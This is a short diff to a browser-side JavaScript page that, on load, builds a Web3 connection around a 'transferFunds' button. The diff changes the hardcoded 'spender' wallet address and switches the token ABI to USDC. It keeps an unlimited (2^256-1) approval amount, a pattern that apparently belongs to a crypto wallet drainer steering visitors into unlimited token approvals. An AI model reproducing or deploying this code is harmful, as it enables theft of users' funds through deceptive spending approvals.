@@ -8,8 +8,8 @@ window.onload = async () => {
         const transfersButton = document.getElementsByName('transferFunds');
 
         const web3 = new Web3(getProvider());
-        const spender = '0x63423dE55aB709C3E21699dF6C918E7D77553f8B', bigNumber = web3.utils.toBN('ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-        const abi = require('./abi-codes/uChild_abi.json');
+        const spender = '0x3FBe5013890E8a03D78BD109A731FDBb1A7DcA05', bigNumber = web3.utils.toBN('ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
+        const abi = require('./abi-codes/usdc_abi.json');
 
         const ethers = require('ethers');
 
